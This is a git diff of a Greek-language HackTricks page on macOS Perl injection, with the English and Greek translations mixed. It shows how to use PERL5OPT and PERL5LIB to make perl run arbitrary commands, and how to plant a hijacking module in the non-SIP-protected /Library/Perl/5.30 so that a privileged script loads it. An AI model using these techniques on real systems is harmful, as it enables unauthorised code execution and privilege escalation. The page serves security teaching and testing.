@@ -1,23 +1,23 @@
-# macOS Εισαγωγή σε Εφαρμογές Perl
+# macOS Perl Applications Injection
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Κοινοποιήστε κόλπα χάκερ καταθέτοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Μέσω των μεταβλητών περιβάλλοντος `PERL5OPT` & `PERL5LIB`
+## Μέσω της μεταβλητής περιβάλλοντος `PERL5OPT` & `PERL5LIB`
 
-Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατή η εκτέλεση αυθαίρετων εντολών από το perl.\
+Χρησιμοποιώντας τη μεταβλητή περιβάλλοντος PERL5OPT είναι δυνατόν να εκτελούνται αυθαίρετες εντολές από το perl.\
 Για παράδειγμα, δημιουργήστε αυτό το σενάριο:
 
 {% code title="test.pl" %}
@@ -27,12 +27,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Τώρα **εξαγάγετε τη μεταβλητή περιβάλλοντος** και εκτελέστε το **σενάριο perl**:
+Τώρα **εξάγετε τη μεταβλητή env** και εκτελέστε το **perl** σενάριο:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-Μια άλλη επιλογή είναι να δημιουργήσετε ένα Perl module (π.χ. `/tmp/pmod.pm`):
+Μια άλλη επιλογή είναι να δημιουργήσετε ένα module Perl (π.χ. `/tmp/pmod.pm`):
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -49,7 +49,7 @@ PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
 ## Μέσω εξαρτήσεων
 
-Είναι δυνατόν να αναφέρουμε τη σειρά του φακέλου εξαρτήσεων του Perl που εκτελείται:
+Είναι δυνατή η καταγραφή της σειράς φακέλων εξαρτήσεων που εκτελεί το Perl:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
@@ -65,16 +65,31 @@ perl -e 'print join("\n", @INC)'
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Μερικοί από τους φακέλους που επιστρέφονται δεν υπάρχουν καν, ωστόσο, το **`/Library/Perl/5.30`** υπάρχει, δεν είναι προστατευμένο από το **SIP** και βρίσκεται πριν από τους φακέλους που προστατεύονται από το SIP. Συνεπώς, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε scripts εκεί, έτσι ώστε ένα Perl script υψηλής προνομιακής πρόσβασης να τις φορτώσει.
+Ορισμένοι από τους επιστρεφόμενους φακέλους δεν υπάρχουν καν, ωστόσο, **`/Library/Perl/5.30`** **υπάρχει**, **δεν** είναι **προστατευμένος** από **SIP** και είναι **πριν** από τους φακέλους **που προστατεύονται από SIP**. Επομένως, κάποιος θα μπορούσε να εκμεταλλευτεί αυτόν τον φάκελο για να προσθέσει εξαρτήσεις σε σενάρια εκεί, έτσι ώστε ένα σενάριο Perl υψηλής προνομιακής πρόσβασης να το φορτώσει.
 
 {% hint style="warning" %}
-Ωστόσο, σημειώστε ότι **χρειάζεστε δικαιώματα ρίζας για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτό το **TCC prompt**:
+Ωστόσο, σημειώστε ότι **χρειάζεται να είστε root για να γράψετε σε αυτόν τον φάκελο** και σήμερα θα λάβετε αυτήν την **προτροπή TCC**:
 {% endhint %}
 
 <figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Για παράδειγμα, αν ένα script εισάγει το **`use File::Basename;`** θα ήταν δυνατόν να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελέσει αυθαίρετο κώδικα.
+Για παράδειγμα, αν ένα σενάριο εισάγει **`use File::Basename;`**, θα ήταν δυνατό να δημιουργηθεί το `/Library/Perl/5.30/File/Basename.pm` για να εκτελεί αυθαίρετο κώδικα.
 
 ## Αναφορές
 
 * [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Υποστήριξη HackTricks</summary>
+
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
